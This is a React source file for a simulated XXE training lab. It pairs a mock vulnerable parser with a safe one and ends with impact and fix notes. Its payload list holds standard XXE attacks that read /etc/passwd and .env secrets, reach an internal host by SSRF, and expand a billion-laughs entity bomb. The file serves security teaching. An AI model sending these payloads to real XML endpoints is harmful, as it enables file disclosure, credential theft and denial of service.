import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { FileCode, ShieldAlert, ShieldCheck, AlertTriangle } from "lucide-react";
import { CyberCard } from "@/components/cyber/CyberCard";
import { CyberButton } from "@/components/cyber/CyberButton";
import { LabFrame, LogPanel, nowTs, type LogEntry } from "@/components/labs/LabFrame";
import { toast } from "sonner";

export const Route = createFileRoute("/labs/xxe")({
  head: () => ({
    meta: [
      { title: "XXE Lab — XML External Entity Injection — Straxon Secure" },
      {
        name: "description",
        content:
          "Exploit XML External Entity (XXE) injection to read files, perform SSRF, and cause DoS.",
      },
    ],
  }),
  component: XXELab,
});

// ─── Simulated XML Parser ────────────────────────────────────────────────────

const READABLE_FILES: Record<string, string> = {
  "/etc/passwd":
    "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:/home/admin:/bin/bash",
  "file:///etc/passwd":
    "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:/var/www:/usr/sbin/nologin",
  "file:///etc/hostname": "webapp-prod-01.straxon.internal",
  "file:///etc/hosts": "127.0.0.1 localhost\n10.0.0.1 internal-db\n10.0.0.2 internal-admin",
  "file:///flag.txt": "straxon{xml_3xt3rn4l_3nt1ty_1nj3ct10n}",
  "file:///var/www/html/.env":
    "DB_HOST=internal-db\nDB_PASS=sup3r_s3cr3t_2026!\nAPI_KEY=sk_prod_straxon_xxe_a7f2b3",
  "http://internal-admin/": 'HTTP/1.1 200 OK\n{"admin":true,"users":123,"revenue":"$2.1M"}',
};

function parseVulnerableXML(xml: string): { result: string; attack?: string; sensitive?: boolean } {
  // Detect ENTITY declaration
  const entityMatch = xml.match(/<!ENTITY\s+(\w+)\s+(?:SYSTEM|PUBLIC)?\s*"([^"]+)"/);
  const entityRefMatch = xml.match(/<!ENTITY\s+(\w+)\s+"([^"]+)"/);

  // Check for billion laughs (DoS)
  if ((xml.match(/<!ENTITY/g) ?? []).length > 3) {
    return {
      result:
        "⚠️ BILLION LAUGHS ATTACK DETECTED\nServer: Memory exhausted — 100% CPU\n[DoS condition triggered]",
      attack: "billion_laughs",
      sensitive: true,
    };
  }

  if (entityMatch) {
    const [, name, url] = entityMatch;
    const ref = new RegExp(`&${name};`, "g");

    if (!xml.match(ref)) {
      return { result: `Entity "${name}" declared but not referenced.` };
    }

    // Look up the file
    const content = READABLE_FILES[url] ?? READABLE_FILES[`file://${url}`];
    if (content) {
      const output = xml
        .replace(ref, content)
        .replace(/<!DOCTYPE[^>]*>/s, "")
        .replace(/<!ENTITY[^>]*>/g, "")
        .trim();
      return {
        result: `Parsed XML:\n${output}\n\n[Resolved &${name}; = file content]:\n${content}`,
        attack: url.startsWith("http") ? "ssrf" : "file_disclosure",
        sensitive: true,
      };
    }

    // SSRF simulation
    if (url.startsWith("http://") || url.startsWith("https://")) {
      return {
        result: `[SSRF] Server fetched: ${url}\nHTTP/1.1 200 OK\n{"internal":"data","secret":"LEAKED"}`,
        attack: "ssrf",
        sensitive: true,
      };
    }

    return { result: `Entity resolved: ${url} → (access denied or file not found)` };
  }

  // Normal XML parsing
  const tagMatches = [...xml.matchAll(/<(\w+)>([^<]*)<\/\1>/g)];
  if (tagMatches.length > 0) {
    const parsed = tagMatches.map(([, tag, val]) => `${tag}: ${val}`).join("\n");
    return { result: `Parsed fields:\n${parsed}` };
  }

  return { result: "XML parsed successfully (no sensitive data)" };
}

function parseSafeXML(xml: string): { result: string; blocked?: boolean } {
  if (
    xml.includes("<!ENTITY") ||
    xml.includes("<!DOCTYPE") ||
    xml.includes("SYSTEM") ||
    xml.includes("PUBLIC")
  ) {
    return {
      result:
        "❌ XML parsing error: DOCTYPE and ENTITY declarations are disabled.\nExternal entity processing has been disabled on this parser.",
      blocked: true,
    };
  }
  const tagMatches = [...xml.matchAll(/<(\w+)>([^<]*)<\/\1>/g)];
  if (tagMatches.length > 0) {
    const parsed = tagMatches.map(([, tag, val]) => `${tag}: ${val}`).join("\n");
    return { result: `Parsed (safe):\n${parsed}` };
  }
  return { result: "XML parsed safely — no threats detected." };
}

const PAYLOADS = [
  {
    label: "Normal XML",
    value: `<?xml version="1.0"?>\n<user>\n  <name>Alice</name>\n  <role>admin</role>\n</user>`,
    desc: "Normal XML input",
  },
  {
    label: "File Read (/etc/passwd)",
    value: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<user><name>&xxe;</name></user>`,
    desc: "Read /etc/passwd",
  },
  {
    label: "Flag Capture",
    value: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY flag SYSTEM "file:///flag.txt">\n]>\n<data>&flag;</data>`,
    desc: "Capture the flag!",
  },
  {
    label: "Env File",
    value: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY env SYSTEM "file:///var/www/html/.env">\n]>\n<config>&env;</config>`,
    desc: "Read .env file with secrets",
  },
  {
    label: "SSRF via XXE",
    value: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY ssrf SYSTEM "http://internal-admin/">\n]>\n<req>&ssrf;</req>`,
    desc: "SSRF through XXE",
  },
  {
    label: "Billion Laughs (DoS)",
    value: `<?xml version="1.0"?>\n<!DOCTYPE lol [\n  <!ENTITY a "BOOM">\n  <!ENTITY b "&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;">\n]>\n<lol>&d;</lol>`,
    desc: "XML bomb DoS attack",
  },
];

function XXELab() {
  const [xml, setXml] = useState(PAYLOADS[0].value);
  const [secure, setSecure] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [output, setOutput] = useState<{
    result: string;
    attack?: string;
    sensitive?: boolean;
    blocked?: boolean;
  } | null>(null);

  const run = () => {
    const res = secure ? parseSafeXML(xml) : parseVulnerableXML(xml);
    setOutput(res);

    setLogs((p) =>
      [
        {
          ts: nowTs(),
          line: `[${secure ? "SAFE" : "VULN"}] Parsing XML (${xml.length} bytes)`,
          level: "info",
        },
        ...(res.attack
          ? [
              {
                ts: nowTs(),
                line: `ATTACK: ${res.attack?.toUpperCase()} — ${res.sensitive ? "Sensitive data leaked!" : ""}`,
                level: "error" as const,
              },
            ]
          : []),
        {
          ts: nowTs(),
          line: res.blocked
            ? "BLOCKED: External entity disabled"
            : `Parsed OK — ${res.sensitive ? "SENSITIVE DATA EXPOSED" : "No threats"}`,
          level: res.blocked ? "ok" : res.sensitive ? "error" : "ok",
        },
        ...p,
      ].slice(0, 30),
    );

    if (res.sensitive && !secure) {
      toast.error(
        `💀 XXE attack successful! ${res.attack === "ssrf" ? "SSRF executed" : "File disclosed"}`,
        { duration: 4000 },
      );
    }
  };

  return (
    <LabFrame title="XML EXTERNAL ENTITY (XXE)" badge="LAB-11" recorderLab="xxe">
      <p className="text-muted-foreground max-w-3xl">
        XML parsers that process external entities allow attackers to read local files, perform
        SSRF, and even trigger DoS (Billion Laughs). Parse crafted XML to exfiltrate server secrets!
      </p>

      <div className="grid lg:grid-cols-2 gap-4">
        <CyberCard variant={secure ? "cyan" : "magenta"}>
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2 text-xs font-mono uppercase tracking-wider">
              {secure ? (
                <ShieldCheck className="h-4 w-4 text-success" />
              ) : (
                <ShieldAlert className="h-4 w-4 text-destructive" />
              )}
              {secure ? "External Entities Disabled" : "External Entities ALLOWED"}
            </div>
            <button
              onClick={() => setSecure((s) => !s)}
              className="text-xs font-mono px-2 py-1 rounded border border-border hover:border-primary transition-colors"
            >
              {secure ? "Switch to Vuln" : "Switch to Safe"}
            </button>
          </div>

          <label className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">
            XML Input
          </label>
          <textarea
            value={xml}
            onChange={(e) => setXml(e.target.value)}
            rows={8}
            className="w-full mt-1 bg-background/60 border border-border rounded px-3 py-2 font-mono text-xs focus:border-primary outline-none resize-none"
          />

          <div className="mt-3 grid grid-cols-2 gap-1.5">
            {PAYLOADS.map((p) => (
              <button
                key={p.label}
                onClick={() => setXml(p.value)}
                title={p.desc}
                className="text-[10px] font-mono px-2 py-1.5 rounded bg-muted/50 hover:bg-destructive/10 hover:text-destructive border border-border transition-colors text-left truncate"
              >
                {p.label}
              </button>
            ))}
          </div>

          <CyberButton onClick={run} className="w-full mt-4" variant={secure ? "cyan" : "magenta"}>
            <FileCode className="h-4 w-4" /> Parse XML
          </CyberButton>
        </CyberCard>

        <CyberCard variant="cyan" className="p-0 overflow-hidden">
          <div className="px-4 py-2.5 border-b border-border/50 bg-background/50 flex items-center gap-2">
            <FileCode className="h-4 w-4 text-muted-foreground" />
            <span className="text-xs font-mono text-muted-foreground">Parser Output</span>
            {output?.sensitive && (
              <span className="text-[10px] text-destructive border border-destructive/40 rounded px-1.5 py-0.5 font-mono">
                DATA LEAKED
              </span>
            )}
          </div>
          <div className="p-4 min-h-48 font-mono text-xs">
            <AnimatePresence mode="wait">
              {output ? (
                <motion.pre
                  key="output"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className={`whitespace-pre-wrap break-all ${output.blocked ? "text-success" : output.sensitive ? "text-warning" : "text-foreground/80"}`}
                >
                  {output.result}
                </motion.pre>
              ) : (
                <span className="text-muted-foreground italic">// Output appears here</span>
              )}
            </AnimatePresence>
          </div>
        </CyberCard>
      </div>

      <LogPanel logs={logs} />

      <div className="grid md:grid-cols-2 gap-4">
        <CyberCard variant="magenta">
          <div className="text-xs font-mono uppercase tracking-wider text-accent mb-2">
            // IMPACT
          </div>
          <ul className="text-sm text-muted-foreground space-y-1">
            <li>
              • <span className="text-warning">Arbitrary file read</span> on the server
            </li>
            <li>• SSRF to internal services via XML parsing</li>
            <li>• Credential theft from config files</li>
            <li>• DoS via exponential entity expansion (Billion Laughs)</li>
          </ul>
        </CyberCard>
        <CyberCard variant="cyan">
          <div className="text-xs font-mono uppercase tracking-wider text-primary mb-2">// FIX</div>
          <ul className="text-sm text-muted-foreground space-y-1">
            <li>• Disable DOCTYPE declarations in XML parser</li>
            <li>• Disable external entity processing</li>
            <li>• Use JSON instead of XML where possible</li>
            <li>
              • Set <code className="text-primary">FEATURE_EXTERNAL_GENERAL_ENTITIES=false</code>
            </li>
            <li>• Limit entity expansion depth and count</li>
          </ul>
        </CyberCard>
      </div>
    </LabFrame>
  );
}
